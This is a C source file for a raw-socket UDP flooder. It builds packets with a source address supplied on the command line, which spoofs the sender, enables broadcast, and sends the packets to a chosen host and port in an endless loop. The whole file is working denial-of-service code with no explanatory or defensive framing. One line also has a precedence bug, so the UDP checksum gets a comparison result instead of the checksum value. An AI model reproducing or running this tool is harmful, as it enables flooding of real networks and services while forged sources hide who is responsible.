#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define TRUE 1

unsigned short in_cksum(unsigned short *addr, int len);

struct pseudo_header{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char place_holder;
	unsigned char protocol;
	unsigned short length;
};

int main(int argc, char **argv){

	struct pseudo_header pseudoHdr;
	int sock_fd, on = 1;
	struct iphdr *ip;
	struct udphdr *udp;
	struct hostent *source, *dest;
	char sendbuf[sizeof(struct iphdr) + sizeof(struct udphdr)], *pseudoPacket;
	struct sockaddr_in target;

	if(argc != 5){
		fprintf(stderr, "Usage: %s <source address> <source port> <destination address> <destination port>\n", argv[0]);
		exit(1);
	}

	if((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(2);
	}

	if(setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(3);
	}

	if(setsockopt(sock_fd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(4);
	}

	if((source = gethostbyname(argv[1])) == NULL){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(5);
	}

	if((dest = gethostbyname(argv[3])) == NULL){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(6);
	}

	memset(&target, 0, sizeof(target));
	target.sin_family = AF_INET;
	target.sin_addr = *(struct in_addr *)dest->h_addr;
	target.sin_port = htons(atoi(argv[4]));

	ip = (struct iphdr *)sendbuf;
	udp = (struct udphdr *)(sendbuf + sizeof(struct iphdr));

	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
	ip->id = getuid();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_UDP;
	ip->check = 0;
	ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
	ip->saddr = *(unsigned long *)source->h_addr;
	ip->daddr = *(unsigned long *)dest->h_addr;

	udp->check = 0;
	udp->dest = htons(atoi(argv[4]));
	udp->len = htons(sizeof(struct udphdr));
	udp->source = htons(atoi(argv[2]));

	pseudoHdr.source_address = *(unsigned long *)source->h_addr;
	pseudoHdr.dest_address = *(unsigned long *)dest->h_addr;
	pseudoHdr.place_holder = 0;
	pseudoHdr.protocol = IPPROTO_UDP;
	pseudoHdr.length = htons(sizeof(struct udphdr));

	if((pseudoPacket = malloc(sizeof(struct pseudo_header) + sizeof(struct udphdr))) == NULL){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(7);
	}
	memcpy(pseudoPacket, &pseudoHdr, sizeof(struct pseudo_header));
	memcpy(pseudoPacket + sizeof(struct pseudo_header), udp, sizeof(struct udphdr));

	if(udp->check = in_cksum((unsigned short *)pseudoPacket, sizeof(struct pseudo_header) + sizeof(struct udphdr)) == 0)
		udp->check = 0xffff;

	printf("Sending...\n");

	while(TRUE){
		if(sendto(sock_fd, sendbuf, sizeof(struct iphdr) + sizeof(struct udphdr), 0, (struct sockaddr *)&target, sizeof(target)) == -1){
			fprintf(stderr, "%s\n", strerror(errno));
			exit(8);
		}
	}

	return 0;

}

unsigned short in_cksum(unsigned short *addr, int len){

	unsigned short result;
	unsigned int sum = 0;

	while(len> 1){
		sum += *addr++;
		len -= 2 ;
	}

	if (len == 1)
		sum += *(unsigned char*)addr;
		
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}
